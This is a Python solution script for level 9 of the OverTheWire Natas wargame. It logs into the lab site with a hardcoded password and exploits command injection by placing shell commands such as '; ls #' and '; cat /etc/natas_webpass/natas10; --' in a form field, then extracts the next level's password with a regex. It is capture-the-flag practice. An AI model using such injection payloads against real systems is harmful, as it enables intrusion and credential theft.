#!/usr/bin/env python

import requests
import re

user = 'natas9'
passw = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'  # from previous level
url = 'http://%s.natas.labs.overthewire.org' % user


# 1st step:  print the sourcecode
'''
r = requests.get(url, auth=(user, passw))
print(r.text)
'''


# 2nd step:  let's try some code injection
'''
r = requests.post(url, auth=(user, passw), data={"submit":"submit", "needle":"; ls #"})
print(r.text)
'''

# after trial and error, we have found ' and " are not working, but ; seems to be working, so this is clearly a code injection on the terminal


# 3rd step: exploiting the vulnerability
#'''
r = requests.post(url, auth=(user, passw), data={"submit":"submit", "needle":"; cat /etc/natas_webpass/natas10; --"})
webPage = r.text
matchObject = re.search('((?!%s)[a-zA-Z0-9]{32})' % passw, webPage)  # we know that the password has length of 32 chars and consisting of alphanum
# the first part of the regular expression is for not to match with our previous password, since it's also present in the sourcecode
print(matchObject.group())
#'''
